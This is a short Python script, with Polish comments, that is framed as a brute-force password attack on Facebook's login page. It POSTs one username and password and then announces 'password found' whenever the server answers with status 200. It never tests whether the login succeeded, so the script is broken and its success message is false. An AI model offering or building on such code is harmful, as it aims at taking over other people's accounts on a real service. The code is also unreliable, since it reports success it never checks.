import requests
import time
import re

def brute_force(username, password, fb_id):
    url = "https://www.facebook.com/login.php"
    payload = {
        "email": username,
        "password": password,
        "login": "Log In"
    }
    response = requests.post(url, data=payload)

    if response.status_code != 200:
        print("Błąd podczas logowania. Kod odpowiedzi:", response.status_code)
        return False

    if not re.match(r'^[0-9]+$', fb_id):
        print("Nieprawidłowy identyfikator Facebooka.")
        return False

    print("Znaleziono hasło:", password)
    return True

def main():
    # Tutaj możesz wprowadzić swoje własne dane logowania
    username = "twoja_nazwa_użytkownika"
    password = "twoje_hasło"
    fb_id = "twój_id_facebooka"

    brute_force(username, password, fb_id)

main()








